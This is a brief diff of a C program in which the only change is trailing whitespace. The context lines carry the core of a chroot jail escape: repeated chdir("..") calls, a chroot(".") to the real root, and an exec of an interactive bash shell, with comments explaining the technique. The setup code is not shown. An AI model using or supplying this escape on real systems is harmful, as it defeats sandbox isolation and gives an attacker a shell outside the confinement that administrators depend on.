@@ -12,7 +12,7 @@ int main() {
     close(fd_we_need);
     for(x = 0; x < 1000; x++) chdir(".."); // Goes up one directory 1000 times
     //Similar to chroot("../../../........");
-    chroot("."); 
+    chroot(".");
     return execl("/bin/bash", "-i", NULL);
 }
 
